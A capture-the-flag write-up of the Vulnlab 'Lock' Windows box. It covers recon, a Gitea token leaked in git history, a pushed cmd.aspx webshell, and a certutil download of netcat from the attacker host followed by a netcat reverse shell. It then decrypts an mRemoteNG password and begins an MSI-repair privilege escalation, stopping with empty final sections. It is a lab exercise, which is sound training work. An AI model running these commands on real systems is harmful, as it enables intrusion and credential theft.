---
title: "Vulnlab - Easy - Lock"
date: 2025-11-05 12:00:00 -0700
categories: [CTF, Vulnlab]
tags: [windows, git, gitea, dirbust, web discovery]
---

![Lock](/assets/img/ctf/vulnhub/easy/lock/lock.png))

# Initial Intel
* Difficulty: Easy
* OS: Windows

# tl;dr
<details><summary>Spoilers</summary>
</details>

# Attack Path

## Recon

### Service Enumeration

```bash
# set host & initiate a standard tcp scan
┌──(haunter㉿kali)-[~/working/vulnhub/easy/lock]
└─$ sudo nmap -A -p- -vvv -T3 --open -oN nmap_tcp_full $lock
...
PORT     STATE SERVICE       REASON          VERSION                                                        
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0                                    
    |_http-title: Lock - Index                            
445/tcp  open  microsoft-ds? syn-ack ttl 127
3000/tcp open  ppp?          syn-ack ttl 127
    <title>Gitea: Git with a cup of tea</title>
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
    | rdp-ntlm-info:                                      
    |   Target_Name: LOCK                                 
    |   NetBIOS_Domain_Name: LOCK
    |   NetBIOS_Computer_Name: LOCK
    |   DNS_Domain_Name: Lock                             
    |   DNS_Computer_Name: Lock
    |   Product_Version: 10.0.20348
5357/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

1. TCP/80 - Webserver
2. TCP/445 - SMB
3. TCP/3000 - ???/Git
4. TCP/3389 - RDP
5. TCP/5357 & 5985 - WinRM

#### TCP/80 - Webserver

![Webserver Landing Page](/assets/img/ctf/vulnhub/easy/lock/1.png)

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]          └─$ feroxbuster --url $lock --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do


```

#### TCP/445 - SMB

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]          └─$ enum4linux-ng -A $lock   
...
NetBIOS computer name: LOCK 
NetBIOS domain name: ''
DNS domain: Lock
FQDN: Lock                                            
Derived membership: workgroup member
...
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'                                    
OS release: ''                                        
OS build: '20348'  

```

#### TCP/3000 - ???/Git

```bash
http://10.10.92.132:3000/
```

![Gitea Landing Page](/assets/img/ctf/vulnhub/easy/lock/2.png)


```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]      
└─$ feroxbuster --url http://$lock:3000 --depth 3 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do

http://10.10.92.132:3000/explore/repos
```

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]
└─$ git clone http://10.10.92.132:3000/ellen.freeman/dev-scripts.git                                        
Cloning into 'dev-scripts'...                                                                               
remote: Enumerating objects: 6, done.                                                                       
remote: Counting objects: 100% (6/6), done.                                                                 
remote: Compressing objects: 100% (4/4), done.                                                              
remote: Total 6 (delta 1), reused 0 (delta 0), pack-reused 0                                                
Receiving objects: 100% (6/6), done.                                                                        
Resolving deltas: 100% (1/1), done.  

┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]
└─$ cd dev-scripts/

┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]
└─$ git log
commit 8b78e6c3024416bce55926faa3f65421a25d6370 (HEAD -> main, origin/main, origin/HEAD)
Author: ellen.freeman <ellen.freeman@localhost.local>
Date:   Wed Dec 27 11:36:39 2023 -0800

    Update repos.py

commit dcc869b175a47ff2a2b8171cda55cb82dbddff3d
Author: ellen.freeman <ellen.freeman@localhost.local>
Date:   Wed Dec 27 11:35:42 2023 -0800

    Add repos.py


┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]
└─$ git show                                                                                                                                                                                                             
commit 8b78e6c3024416bce55926faa3f65421a25d6370 (HEAD -> main, origin/main, origin/HEAD)                                                                                                                                 
Author: ellen.freeman <ellen.freeman@localhost.local>                                                                                                                                                                    
Date:   Wed Dec 27 11:36:39 2023 -0800                                                                                                                                                                                   
                                                                                                                                                                                                                         
    Update repos.py                                                                                                                                                                                                      
                                                                                                                                                                                                                         
diff --git a/repos.py b/repos.py                                                                                                                                                                                         
index dcaf2ef..e278e49 100644                                                                                                                                                                                            
--- a/repos.py                                                                                                                                                                                                           
+++ b/repos.py                                                                                                                                                                                                           
@@ -1,8 +1,6 @@                                                                                                                                                                                                          
 import requests                                                                                                                                                                                                         
 import sys                                                                                                                                                                                                              
-                                                                                                                                                                                                                        
-# store this in env instead at some point                                                                                                                                                                               
-PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'                                                                                                                                                      
+import os                                                                                                                                                                                                               
                                                                                                                                                                                                                         
 def format_domain(domain):                                                                                                                                                                                              
     if not domain.startswith(('http://', 'https://')):                                                                                                                                                                  
@@ -28,8 +26,13 @@ def main():                                                                                                                                                                                           
:...skipping...                                                                                                                                                                                                          
commit 8b78e6c3024416bce55926faa3f65421a25d6370 (HEAD -> main, origin/main, origin/HEAD)                                                                                                                                 
Author: ellen.freeman <ellen.freeman@localhost.local>
Date:   Wed Dec 27 11:36:39 2023 -0800

    Update repos.py

diff --git a/repos.py b/repos.py
index dcaf2ef..e278e49 100644
--- a/repos.py
+++ b/repos.py
@@ -1,8 +1,6 @@
 import requests
 import sys
-                               
-# store this in env instead at some point
-PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'
+import os                                                                                                  
                                                                                                            
 def format_domain(domain):    
     if not domain.startswith(('http://', 'https://')):
@@ -28,8 +26,13 @@ def main():              
                                          
     gitea_domain = format_domain(sys.argv[1])
  
+    personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')
+    if not personal_access_token:
+        print("Error: GITEA_ACCESS_TOKEN environment variable not set.")
+        sys.exit(1)
+
     try:
-        repos = get_repositories(PERSONAL_ACCESS_TOKEN, gitea_domain)
+        repos = get_repositories(personal_access_token, gitea_domain)
         print("Repositories:")
         for repo in repos:
             print(f"- {repo['full_name']}")


┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]
└─$
```
```bash
┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/dev-scripts]
└─$ vim repos.py 

┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/dev-scripts]
└─$ python3 repos.py 
Usage: python script.py <gitea_domain>
```

```bash

┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/dev-scripts]
└─$ python3 repos.py http://$lock:3000
Repositories:
- ellen.freeman/dev-scripts
- ellen.freeman/website

```

```bash
Powered by Gitea
Version: 1.21.3

http://10.10.92.132:3000/api/swagger#/repository/repoGet

```

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]
└─$ curl -H "Authorization: token 43ce39bb0bd6bc489284f2905f033ca467a6362f" -O http://$lock/api/v1/repos/ellen.freeman/website/archive/master.zip                                                                        
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1245  100  1245    0     0   3725      0 --:--:-- --:--:-- --:--:--  3716

┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]
└─$ unzip master.zip 
Archive:  master.zip
  End-of-central-directory signature not found.  Either this file is not
  a zipfile, or it constitutes one disk of a multi-part archive.  In the
  latter case the central directory and zipfile comment will be found on
  the last disk(s) of this archive.
unzip:  cannot find zipfile directory in one of master.zip or
        master.zip.zip, and cannot find master.zip.ZIP, period.

```

[Gitea - cloning a repository](https://forum.gitea.com/t/solved-clone-repo-using-token/1816)

You can use the token as a password when cloning!


```bash
git clone http://$lock:3000/ellen.freeman/website.git
Cloning into 'website'...
Username for 'http://10.10.94.199:3000': ellen.freeman
Password for 'http://ellen.freeman@10.10.94.199:3000': 43ce39bb0bd6bc489284f2905f033ca467a6362f
remote: Enumerating objects: 165, done.
remote: Counting objects: 100% (165/165), done.
remote: Compressing objects: 100% (128/128), done.
remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0
Receiving objects: 100% (165/165), 7.16 MiB | 1.08 MiB/s, done.
Resolving deltas: 100% (35/35), done.

┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]
└─$ cd website/

┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]
└─$ git status
On branch main
Your branch is up to date with 'origin/main'.

nothing to commit, working tree clean                                                                                                                                                                                                                         
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]  └─$ git config --global user.email "ellen.freeman"                                                                                                                                                                                                      
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website] 
└─$ git config --global user.name "ellen.freeman"                                                                                                                                                                    
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]  └─$ echo "test" > test.txt                                                                                                                                                                                           
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]  
└─$ git add *                                                                                                 
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]  └─$ git commit -m "adds test.txt"                                                                        
[main 236ab92] adds test.txt                                                                                
 1 file changed, 1 insertion(+)                                                                               create mode 100644 test.txt                           

┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]
└─$ git push                                          
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 6 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 991 bytes | 991.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.10.123.175:3000/ellen.freeman/website.git 
   236ab92..aca371d  main -> main
```

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]
└─$ cp ../cmd.aspx .

┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]
└─$ git add *

┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]
└─$ git commit -m "Adds cmd.aspx webshell"
[main aca371d] Adds cmd.aspx webshell
 1 file changed, 42 insertions(+)
 create mode 100755 cmd.aspx

┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/website]
└─$ git push
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 6 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 991 bytes | 991.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.10.123.175:3000/ellen.freeman/website.git
   236ab92..aca371d  main -> main
```

```bash
certutil -f -urlcache http://10.8.7.193:8000/win/nc64.exe c:\windows\temp\nc.exe

c:\windows\temp\nc.exe -nv 10.8.7.193 80 -e powershell
```

```bash
┌──(haunter㉿kali)-[~/working/vulnlab/easy/lock]
└─$ sudo nc -lvnp 80                                                                                        
listening on [any] 80 ...
connect to [10.8.7.193] from (UNKNOWN) [10.10.123.175] 50259                                                 
PS C:\windows\system32\inetsrv> cd c:\users\
cd c:\users\                                          
PS C:\users> ls                                       
ls                                                    
    Directory: C:\users                               
Mode                 LastWriteTime         Length Name                                                      ----                 -------------         ------ ----                                                      d-----        12/27/2023   2:00 PM                .NET v4.5                                                 d-----        12/27/2023   2:00 PM                .NET v4.5 Classic                                         d-----        12/27/2023  12:01 PM                Administrator                                             d-----        12/28/2023  11:36 AM                ellen.freeman                                             d-----        12/28/2023   6:14 AM                gale.dekarios                                             d-r---        12/27/2023  10:21 AM                Public           
```
## Lateral Movement / Privilege Escalation

```bash
c:\Users>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users> get-childitem -path c:\users\ -include *.txt,*.pdf,*.doc,*.docx,*.xls,*.xlsx,*.log,*.conf,*.xml -file -recurse -erroraction silentlycontinue
get-childitem -path c:\users\ -include *.txt,*.pdf,*.doc,*.docx,*.xls,*.xlsx,*.log,*.conf,*.xml -file -recurse -erroraction silentlycontinue


    Directory: C:\users\ellen.freeman\Documents


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        12/28/2023   5:59 AM           3341 config.xml    
```

```bash
(Penelope)─(Session [1])> download config.xml                                                                                                                                                                             
[+] Download OK '/home/haunter/.penelope/LOCK~10.10.76.201_Microsoft_Windows_Server_2022_Standard_x64-based_PC/downloads/config.xml'
```


```bash
Username="Gale.Dekarios"
TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==
```



```bash
┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]                                                                                                                  
└─$ git clone https://github.com/gquere/mRemoteNG_password_decrypt.git                                                                                                                                                    
Cloning into 'mRemoteNG_password_decrypt'...                                                                                                                                                                              
remote: Enumerating objects: 11, done.                                                                                                                                                                                    
remote: Counting objects: 100% (11/11), done.                                                                                                                                                                             
remote: Compressing objects: 100% (9/9), done.                                                                                                                                                                            
remote: Total 11 (delta 2), reused 10 (delta 2), pack-reused 0 (from 0)                                                                                                                                                   
Receiving objects: 100% (11/11), done.                                                                                                                                                                                    
Resolving deltas: 100% (2/2), done.     



┌──(vEnv)(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock/mRemoteNG_password_decrypt]
└─$ python3 mremoteng_decrypt.py ../config.xml 
Name: RDP/Gale
Hostname: Lock
Username: Gale.Dekarios
Password: ty8wnW9qCKDosXo6
```

[mremoteng decrypt tool](https://github.com/gquere/mRemoteNG_password_decrypt)

```bash
┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/vulnhub/easy/lock]
└─$ rdp-connect /u:gale.dekarios /p:ty8wnW9qCKDosXo6 /v:$lock
```

```bash
Get-ChildItem -Path 'C:\' -Filter '*.msi' -File -Recurse -Force -ErrorAction SilentlyContinue
...
C:\_install\pdf24-creator-11.15.1-x64.msi
```

https://github.com/p1sc3s/Symlink-Tools-Compiled/blob/master/SetOpLock.exe

```powershell
PS C:\Users\gale.dekarios> msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi
```
## Root / SYSTEM
# Lessons Learned

